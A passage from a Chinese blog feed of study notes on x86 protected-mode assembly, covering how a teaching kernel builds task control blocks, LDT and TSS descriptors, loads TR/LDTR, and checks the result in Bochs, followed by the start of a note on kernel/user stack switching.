id="03-将任务控制块加入任务控制块链表"><a href="#03-将任务控制块加入任务控制块链表" class="headerlink" title="03. 将任务控制块加入任务控制块链表"></a>03. 将任务控制块加入任务控制块链表</h2><p>本节主要讲解内核代码段中的<mark>append_to_tcb_link</mark>，在内核数据段定义标号<mark>tcb_chain dd 0</mark>，是一个指针，用来保存第一个任务控制块的线性基地址，称为头指针，为0表示链表为空没有任务。</p><p>其中<mark>任务控制块TBC</mark>的结构如下：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ce3bc67dccb3b41f1febe9240302f413.png" class=""><p>任务控制链表：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ee187f1224874532ea372e7da9d13217.png" class=""><p>清除<mark>TCB</mark>指针域：表明当前<mark>TCB</mark>是最后一个</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/3fbfe4df62a5f872cbf49f5b77a02957.png" class=""><p>判断链表中是否为空，为空表示这是第一个<mark>TCB</mark>：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/18bca96edb3afcc2347f93c302822341.png" class=""><p>若链表不为空，顺着链表找到最后一个<mark>TCB</mark>：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e399cbf96b88e4333b5f044b82f246d5.png" class=""><p>找到最后一个<mark>TCB</mark>，指向新的<mark>TCB</mark>，然后恢复压栈的内容并返回调用者：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/8b8849472c1019804866c7e05797ad3d.png" class=""><h2 id="04-通过栈传递例程参数和立即数的压栈指令"><a href="#04-通过栈传递例程参数和立即数的压栈指令" class="headerlink" title="04. 通过栈传递例程参数和立即数的压栈指令"></a>04. 通过栈传递例程参数和立即数的压栈指令</h2><p>接上一节，在创建<mark>TCB</mark>之后接着加载和重定位用户程序并创建一个任务。使用<strong>callload_relocate_program</strong>调用例程<strong>load_relocate_program</strong>，使用栈传递参数，此时的栈是在引导程序中定义的4K字节、基地址为<strong>0x7c00</strong>的栈。<br>代码如下：</p><pre><code class="assembly">         push dword 50                      ;用户程序位于逻辑50扇区         push ecx                           ;压入任务控制块起始线性地址                 call load_relocate_program  </code></pre><p>其中立即数的压栈指令：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/d10aafc7c601090eaf89826ba9335b01.png" class=""><p><strong>push imm8：</strong></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/f0947f4f65d29cd80eb688aa43360f92.png" class=""><p><strong>push imm16：</strong></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ade7696522ed4dd6d4fa90da0f48ea0d.png" class=""><p><strong>push imm32：</strong></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/627a51a70090a1105c6077311c122057.png" class=""><p>压栈可以不需要容器，即直接使用立即数，但是出栈需要有容器接着：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/b404d38251d64069081e94f8d38fb6c8.png" class=""><p>其中处理器使用32位操作尺寸，压入一个双字，<mark>0x00000055</mark>。出栈使用32位寄存器<mark>EDX</mark>或者是一个<mark>dword修饰的内存地址</mark>。这里压栈和出栈的尺寸必须一致，否则会影响栈平衡。</p><h2 id="05-段寄存器的压栈和出栈以及栈的随机访问机制"><a href="#05-段寄存器的压栈和出栈以及栈的随机访问机制" class="headerlink" title="05. 段寄存器的压栈和出栈以及栈的随机访问机制"></a>05. 段寄存器的压栈和出栈以及栈的随机访问机制</h2><p>接上一节，进入<strong>load_relocate_program</strong>例程之后进行段寄存器的压栈操作：</p><pre><code class="assembly">load_relocate_program:                      ;加载并重定位用户程序                                            ;输入: PUSH 逻辑扇区号                                            ;      PUSH 任务控制块基地址                                            ;输出：无          pushad               push ds         push es </code></pre><p>其中段寄存器的压栈操作：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/2ef30935b1b304720d708133a0879d04.png" class=""><p>段寄存器的出栈操作：<strong>pop cs</strong>指令非法</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ce5a6531157fcbe769f3ae15be1df14c.png" class=""><p>接着执行命令：<br><code>mov ebp,esp                        ;为访问通过堆栈传递的参数做准备 </code></p><p>此时栈的分布：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/b69d353526e838f9c65efbc8549a4464.png" class=""><p>使用<strong>EBP</strong>记录<strong>ESP</strong>的值，用来访问战中的参数，可以在不破坏栈顶指针<strong>ESP</strong>的情况下去访问栈中的其他数据</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/dfb12cdd8ede0931a90a06b31e0be0ba.png" class=""><p>其中若使用<mark>BP或者EBP</mark>访问栈，那么默认的前缀是栈段<mark>SS</mark>。</p><h2 id="06-创建任务的局部描述符LDT"><a href="#06-创建任务的局部描述符LDT" class="headerlink" title="06. 创建任务的局部描述符LDT"></a>06. 创建任务的局部描述符LDT</h2><p>任务共有的部分安装在<strong>GDT</strong>，私有的部分安装在<strong>LDT</strong>中。</p><p>接上一节，在<strong>load_relocate_program</strong>例程中：申请创建LDT所需要的内存、加载用户程序、判断整个用户程序的尺寸，之后建立用户头部段描述符、使用例程<strong>fill_descriptor_in_ldt</strong>将描述符安装在LDT中。</p><p>申请LDT内存：LDT的大小可以自己设置，最大也是64K字节</p><pre><code class="assembly">         ;以下申请创建LDT所需要的内存         mov ecx,160                        ;允许安装20个LDT描述符         call sys_routine_seg_sel:allocate_memory         mov [es:esi+0x0c],ecx              ;登记LDT基地址到TCB中         mov word [es:esi+0x0a],0xffff      ;登记LDT初始的界限到TCB中  </code></pre><p>申请过的<strong>LDT</strong>可以将之保存在<strong>TCB</strong>中</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/12109993c7e17ddfd5c8879bae856361.png" class=""><p>登记过LDT的线性地址和界限值之后，接下来我们要从硬盘读取用户程序：将加载的用户程序的首地址也保存在<strong>TCB</strong>中。</p><pre><code class="assembly"> ;以下开始加载用户程序          mov eax,core_data_seg_sel         mov ds,eax                         ;切换DS到内核数据段                mov eax,[ebp+12*4]                 ;从堆栈中取出用户程序起始扇区号          mov ebx,core_buf                   ;读取程序头部数据              call sys_routine_seg_sel:read_hard_disk_0         ;以下判断整个程序有多大         mov eax,[core_buf]                 ;程序尺寸         mov ebx,eax         and ebx,0xfffffe00                 ;使之512字节对齐（能被512整除的数低          add ebx,512                        ;9位都为0          test eax,0x000001ff                ;程序的大小正好是512的倍数吗?          cmovnz eax,ebx                     ;不是。使用凑整的结果               mov ecx,eax                        ;实际需要申请的内存数量         call sys_routine_seg_sel:allocate_memory         mov [es:esi+0x06],ecx              ;登记程序加载基地址到TCB中 </code></pre><p>然后创建用户程序头部段描述符，将之安装在LDT中</p><pre><code class="assembly">         mov ebx,ecx                        ;ebx -&gt; 申请到的内存首地址         xor edx,edx         mov ecx,512         div ecx         mov ecx,eax                        ;总扇区数                mov eax,mem_0_4_gb_seg_sel         ;切换DS到0-4GB的段         mov ds,eax         mov eax,[ebp+12*4]                 ;起始扇区号   .b1:         call sys_routine_seg_sel:read_hard_disk_0         inc eax         loop .b1                           ;循环读，直到读完整个用户程序         mov edi,[es:esi+0x06]              ;获得程序加载基地址         ;建立程序头部段描述符         mov eax,edi                        ;程序头部起始线性地址         mov ebx,[edi+0x04]                 ;段长度         dec ebx                            ;段界限         mov ecx,0x0040f200                 ;字节粒度的数据段描述符，特权级3          call sys_routine_seg_sel:make_seg_descriptor               ;安装头部段描述符到LDT中          mov ebx,esi                        ;TCB的基地址         call fill_descriptor_in_ldt               </code></pre><h2 id="07-在当前任务的LDT中安装描述符"><a href="#07-在当前任务的LDT中安装描述符" class="headerlink" title="07. 在当前任务的LDT中安装描述符"></a>07. 在当前任务的LDT中安装描述符</h2><p>接上一节，在LDT中安装一个新的描述符</p><pre><code class="assembly">SECTION core_code vstart=0;-------------------------------------------------------------------------------fill_descriptor_in_ldt:                     ;在LDT内安装一个新的描述符                                            ;输入：EDX:EAX=描述符                                            ;          EBX=TCB基地址                                            ;输出：CX=描述符的选择子  </code></pre><p><strong>fill_descriptor_in_ldt</strong>例程中运行。</p><p>PS：CX在计算过程中溢出的进位不会影响ECX的高16位，而是会被丢弃。</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/0f5d7f1bb33536bbe7d31c87d29d3bd0.png" class=""><p>更新<strong>TI位为1</strong>，表示在<strong>LDT</strong>中：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/7f2cbf0b0f1b4e73fa3749111e55d15a.png" class=""><h2 id="08-LDT描述符的格式和创建"><a href="#08-LDT描述符的格式和创建" class="headerlink" title="08. LDT描述符的格式和创建"></a>08. LDT描述符的格式和创建</h2><p>描述符的分类：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/5aac46f717951bdd2dea3d68d46c2791.png" class=""><p><mark>GDT</mark>的线性基地址存放在<mark>GDTR</mark>寄存器中，<mark>LDT=和</mark>TSS的线性基地址存放在<mark>GDT</mark>中，即<mark>LDT、TSS</mark>也有自己的段描述符，需要安装在<mark>GDT</mark>中。</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e59e39f48ec6f9df891a080bf2abad4d.png" class=""><p>描述符中的<mark>S位</mark>和<mark>TYPE</mark>字段：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/769a49d03264c86aa8d7f323422ae21f.png" class=""><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/6f62dba6c15ef8a90f6ef0af2a657ea1.png" class=""><ul><li><strong>S=0</strong>表示系统描述符中，在系统描述符中21、22位是没有意义的置零即可</li><li><strong>TYPE = 0010</strong>表示为<strong>LDT描述符</strong></li></ul><p>在<strong>GDT</strong>中登记<strong>LDT</strong>描述符：</p><pre><code class="assembly">         ;在GDT中登记LDT描述符         mov eax,[es:esi+0x0c]              ;LDT的起始线性地址         movzx ebx,word [es:esi+0x0a]       ;LDT段界限         mov ecx,0x00408200                 ;LDT描述符，特权级0         call sys_routine_seg_sel:make_seg_descriptor         call sys_routine_seg_sel:set_up_gdt_descriptor         mov [es:esi+0x10],cx               ;登记LDT选择子到TCB中</code></pre><p>其中：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/3db05c407cd5675e55fdc0cdaadb9392.png" class=""><ul><li><strong>S = 0</strong>：表示系统描述符；</li><li><strong>TYPE = 0010</strong>：表示<strong>LDT</strong>描述符；</li><li><strong>P = 1</strong>：表示段存在；</li><li><strong>G = 0</strong>：表示段界限以字节为单位；</li></ul><h2 id="09-创建任务状态段TSS"><a href="#09-创建任务状态段TSS" class="headerlink" title="09. 创建任务状态段TSS\"></a>09. 创建任务状态段TSS\</h2><p>除了局部描述符表LDT，每个任务还应该有一个任务状态段TSS，TSS的基本长度是104个字节</p><p>接上一节，本节创建<strong>TSS</strong>，代码如下：</p><pre><code class="assembly">         ;创建用户程序的TSS         mov ecx,104                        ;tss的基本尺寸         mov [es:esi+0x12],cx                       dec word [es:esi+0x12]             ;登记TSS界限值到TCB          call sys_routine_seg_sel:allocate_memory         mov [es:esi+0x14],ecx              ;登记TSS基地址到TCB    </code></pre><p>其中<strong>TSS</strong>的内存分布：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/6219d16607c30cad62c9818e5ff6d8ca.png" class=""><p>若<mark>T位为1</mark>，在多任务环境中每次切换到该任务时，将引发一个调试异常中断，所以我们将此为置零。</p><p>然后创建完TSS就将LDT选择子从TCB任务控制块中写入TSS</p><pre><code class="assembly">         mov dx,[es:esi+0x10]               ;登记任务的LDT选择子         mov [es:ecx+96],dx                 ;到TSS中 </code></pre><h2 id="10-TSS描述符的格式和创建"><a href="#10-TSS描述符的格式和创建" class="headerlink" title="10. TSS描述符的格式和创建"></a>10. TSS描述符的格式和创建</h2><p>接上一节，本节在<mark>GDT</mark>中登记TSS描述符。<br>    将创建好的TSS描述符登记到GDT中，GDT登记完成后返回TSS选择子再存入TCB任务控制块中。</p><pre><code class="assembly">         ;在GDT中登记TSS描述符         mov eax,[es:esi+0x14]              ;TSS的起始线性地址         movzx ebx,word [es:esi+0x12]       ;段长度（界限）         mov ecx,0x00408900                 ;TSS描述符，特权级0         call sys_routine_seg_sel:make_seg_descriptor         call sys_routine_seg_sel:set_up_gdt_descriptor         mov [es:esi+0x18],cx               ;登记TSS选择子到TCB </code></pre><p><strong>TSS</strong>描述符格式：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/bfeaad06d3448d6d42ebd37f1ec5c946.png" class=""><ul><li><strong>S = 0</strong>：表示为系统描述符</li><li><strong>TYPE中的B位（Busy）</strong>：此位由处理器根据任务的状态实时修改，我们创建时置零就好。</li></ul><h2 id="11-用带参数的RET指令返回调用者"><a href="#11-用带参数的RET指令返回调用者" class="headerlink" title="11. 用带参数的RET指令返回调用者"></a>11. 用带参数的RET指令返回调用者</h2><p>接上一节，本节从例程<mark>load_relocate_program</mark>返回调用者，在返回之前栈的状态：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/89bedf3bfdcf7a56a9f9c5745d796fc4.png" class=""><p>在执行下列出栈指令之后：</p><pre><code class="assembly">         pop es                             ;恢复到调用此过程前的es段          pop ds                             ;恢复到调用此过程前的ds段               popad </code></pre><p>栈的状态为：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/7bf9a54f2a7cbf0f21dd5c26c5a1157a.png" class=""><p>然后执行返回指令：</p><pre><code>         ret 8                              ;丢弃调用本过程前压入的参数  </code></pre><p>栈的状态：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/2de3214d8bf9a99c0f35e70e3d5dd025.png" class=""><p>其中<strong>ret imm、retf imm</strong>指令：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/fdfe40783a41395117ef15e131ff7d12.png" class=""><p>到目前为止的内存布局：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/e2aa71ca1a29a5b9f879751e458972b0.png" class=""><h2 id="12-加载任务寄存器TR和局部描述符表寄存器LDTR"><a href="#12-加载任务寄存器TR和局部描述符表寄存器LDTR" class="headerlink" title="12. 加载任务寄存器TR和局部描述符表寄存器LDTR"></a>12. 加载任务寄存器TR和局部描述符表寄存器LDTR</h2><p>接上一节，接下来从<mark>load_relocate_program</mark>返回，之后要转到任务私有部分（用户程序）执行。</p><p>在多任务系统中，有多个任务、多个TSS、LDT。</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/7af42fc51d3fd107ac29d2e88d88fec8.png" class=""><p>8086使用寄存器<mark>TR&amp;LDTR<mark>来存储<strong>TSS</strong>&amp;<strong>LDT</strong>的基地址和界限</mark></mark></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/05f3b2181bc5fcf58539e83c149ef293.png" class=""><p><mark>TR&amp;LDTR</mark>结构：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1508e59aad6f3af7980b3a068664d8e9.png" class=""><p><mark>TR&amp;LDTR</mark>可以使用<mark>ltr&amp;lldt</mark>指令加载：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/786156d01803a7590541675d193fdcde.png" class=""><p><mark>LDTR</mark>加载过程：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1b905e09c73bf3c3c1d77e200f5758d7.png" class=""><ul><li><strong>lldt r/m16</strong>指令执行时，将选择子送入<strong>LDTR</strong>的LDT选择器中；</li><li>处理器从<strong>GDT</strong>中取出<strong>LDT</strong>描述符；</li><li>将<strong>LDT</strong>描述符中的<strong>LDT</strong>线性基地址送入<strong>LDT描述符高速缓存器中的32位线性基地址</strong>部分；</li><li>之后<strong>LDTR</strong>就指向<strong>LDT</strong>；</li></ul><p><mark>TR</mark>加载过程：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ecadab5ad4f6f0d59de9f22e0a8c42f9.png" class=""><ul><li><strong>ltr r/m16</strong>指令执行时，将选择子送入TR的TSS选择器中；</li><li>处理器从<strong>GDT</strong>中取出<strong>TSS</strong>描述符；</li><li>将<strong>TR</strong>描述符中的<strong>TSS</strong>线性基地址送入<strong>TR描述符高速缓存器中的32位线性基地址</strong>部分；</li><li>之后<strong>TR</strong>就指向<strong>TSS</strong>；</li></ul><p>加载完之后就跳转用户程序执行。</p><h2 id="13-在虚拟机上验证人物的执行"><a href="#13-在虚拟机上验证人物的执行" class="headerlink" title="13. 在虚拟机上验证人物的执行"></a>13. 在虚拟机上验证人物的执行</h2><p>写数据并执行：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/fc609296920402a864a71c3c4003d99d.png" class=""><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/3460dbd92cd27aadcd34d7ecd03e5a18.png" class=""><p>Bochs虚拟机：<br>在0x7c00（主引导程序）断下来之后设置<mark>modbp<mark>断点，会在从实模式切换到保护模式的时候断下来。</mark></mark></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/0ce3eb8e6bbc3727718a4c8430f3ad4b.png" class=""><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/74325049411650aa30b1c896a5631a66.png" class=""><p>进入内核：</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/32f951f463d45ebd695f1df9b36bc3be.png" class=""><p>执行完<mark>lldt</mark>指令之后看一下寄存器的状态：<strong>ldtr和gdtr</strong>的内容</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/2dc168b9cc4ac2f907d58cc0efb1e95e.png" class=""><p>查看<strong>GDT</strong>内容：<strong>info gdt</strong></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/b2344de727b335d75477e107d2561bfa.png" class=""><p>查看描述符详细信息：<strong>info gdt 5</strong></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/f282e04e9d4a6ad7737ec2397b870111.png" class=""><p>查看<strong>LDT</strong>内容以及每个描述符的详细信息：<strong>info ldt</strong></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/a482da14f8170c07d4ca4d2d4efc14ad.png" class=""><p>查看<strong>TSS</strong>信息：<strong>info tss</strong></p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/61ce088f2f0a21ae4ec28b11e8ab7c9d.png" class=""><p>运行结果：正常执行</p><img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/image-20221113164719509.png" class="" title="image-20221113164719509">]]></content>
      
      
      <categories>
          
          <category> Windows保护模式 </category>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> X86汇编语言：实模式到保护模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>26. 用户程序编程接口及其实现</title>
      <link href="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="01-内核与用户程序之间的栈切换问题"><a href="#01-内核与用户程序之间的栈切换问题" class="headerlink" title="01.内核与用户程序之间的栈切换问题"></a>01.内核与用户程序之间的栈切换问题</h2><p>从内核进入用户程序时，使用的是<mark>call far</mark>指令，这是一个过程调用指令，是需要使用<mark>retf</mark>指令返回的。过程调用需要隐式的栈操作，使用栈来保存返回地址，因此当<mark>call far</mark>指令执行时需要将下一条指令的地址压入当前正在使用的栈中保存，也就是内核的栈中。</p><span id="more"></span><p>用户程序：</p><pre><code class="assembly">start:         mov eax,ds;此时DS指向用户程序头部段         mov fs,eax;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS         mov ss, [fs:stack_seg]         mov esp,stack_end         ;mov eax,[data_seg]         ;mov ds,eax         ;用户程序要做的事情（省略）         retf </code></pre><p>一旦将栈切换到用户程序自己的栈中，将无法返回内核，因为<mark>retf</mark>指令执行时要从栈中弹出内核的栈状态到<mark>CS</mark>和<mark>ESP</mark>。但是当前使用的时用户程序的栈而非内核的栈，这些地址时保存在内核的栈中的。</p><p>修改用户程序，在进入用户程序之后先保存内核栈的<mark>SS和ESP</mark>再使用用户程序自己的栈，在使用<mark>retf</mark>返回内核时再恢复栈为内核的栈地址：</p><p>添加用户栈常量：</p><pre><code class="assembly">SECTION data vstart=0         os_ss             dw 0;用于保存内核栈的状态         os_esp            dd 0         message_1         db  0x0d,0x0a,0x0d,0x0a                           db  '**********User program is runing**********'                           db  0x0d,0x0a,0data_end:</code></pre><p><mark>retf</mark>时恢复<mark>SS和ESP</mark></p><pre><code class="assembly">start:         mov eax,ds;此时DS指向用户程序头部段         mov fs,eax;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS         mov ds,[fs:data_seg] ;切换到用户程序自己的数据段         mov [os_ss],ss       ;将ss的当前值保存到os_ss和os_esp         mov [os_esp],esp         mov ss,[fs:stack_seg] ;将栈切换到用户程序自己的栈         mov esp,stack_end         mov ss,[os_ss]       ;恢复内核栈的状态         mov esp,[os_esp]         ;用户程序要做的事情（省略）         retf                                     ;将控制权返回到系统</code></pre><p>因为我们在用户代码中保存了内核的栈状态<mark>SS、ESP</mark>，所以就不用在内核中再重复写代码恢复这个状态了。</p><ul><li>进入用户程序之前临时保存堆栈指针的指令</li><li>回到内核之后切换回内核自己堆栈的指令<img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/ece9a96ffb6a138049089d2e4501acaa.png" class=""></li></ul><p>虚拟机验证：修改是可行的</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/6b36567294d1198d09571ace0663403c.png" class=""><p><strong>虽然可以这样做，但是需要禁止这样的做法。</strong></p><ul><li><strong>首先因为用户程序不需要为内核提供服务，比如为内核保存栈状态等等</strong></li><li><strong>其次内核必须是稳定的，不能依赖于用户程序否则用户程序一旦出错内核也将崩溃是不行的</strong></li></ul><h2 id="02-内核中位用户程序提供编程支持"><a href="#02-内核中位用户程序提供编程支持" class="headerlink" title="02. 内核中位用户程序提供编程支持"></a>02. 内核中位用户程序提供编程支持</h2><p>在用户程序中暂时无法访问现存，在进入内核之前创建过一个显存的描述符由内核使用。因此我们知道显存的段选择子，在原则上就可以在用户程序中访问显存显示文本。也可以使用内核中的<mark>put_string</mark>例程来显示字符串。</p><p>代码如下：</p><ul><li>定义的字符串</li></ul><pre><code class="assembly">SECTION data vstart=0         os_ss             dw 0;用于保存内核栈的状态         os_esp            dd 0         message_1         db  0x0d,0x0a,0x0d,0x0a                           db  '**********User program is runing**********'                           db  0x0d,0x0a,0data_end:</code></pre><ul><li>使用显存的描述符</li></ul><pre><code class="assembly">start:         mov eax,ds;此时DS指向用户程序头部段         mov fs,eax;但是我们不能失去对DS的追踪，所以使用其他FS段寄存器重新设置DS         mov ds,[fs:data_seg] ;切换到用户程序自己的数据段         mov [os_ss],ss       ;将ss的当前值保存到os_ss和os_esp         mov [os_esp],esp         mov ss,[fs:stack_seg] ;将栈切换到用户程序自己的栈         mov esp,stack_end                 mov ebx,message_1         call 0x28:0;0x28是内核公共历程段的选择子         ;0是put_string例程在内核公共历程段内的偏移         mov ss,[os_ss]     ;恢复内核栈的状态         mov esp,[os_esp]         ;用户程序要做的事情（省略）         retf                                     ;将控制权返回到系统</code></pre><p>虚拟机运行成功：</p><img src="/2022/12/11/26-%E7%94%A8%E6%88%B7%E7%A8%8B%E5%BA%8F%E7%BC%96%E7%A8%8B%E6%8E%A5%E5%8F%A3%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/af5adf72e8ff8e697afd26a16f724fd4.png" class=""><p>但是通常用户程序不可能知道内核的<mark>段选择子</mark>和内核中的<mark>例程</mark>，所以上述代码一般不会出现。但是用户程序也可以自己安装一些描述符在<mark>GDT</mark>中，如显存的段描述符，不过一般不能这样做，<mark>GDT</mark>只能给内核使用不然有可能会造成内核的崩溃。</p><p>所以处理器有了特权级<mark>DPL</mark>的概念，来限制用户程序的权限。但是内核会给用户程序提供一些例程，供其使用（<em>也可以在一定程度上减少用户程序重复造轮子</em>），也叫用户程序接口（API：Applicatio Programming Interface）。</p><h2 id="03-用户程序中的符号地址检索表"><a href="#03-用户程序中的符号地址检索表" class="headerlink" title="03. 用户程序中的符号地址检索表"></a>03. 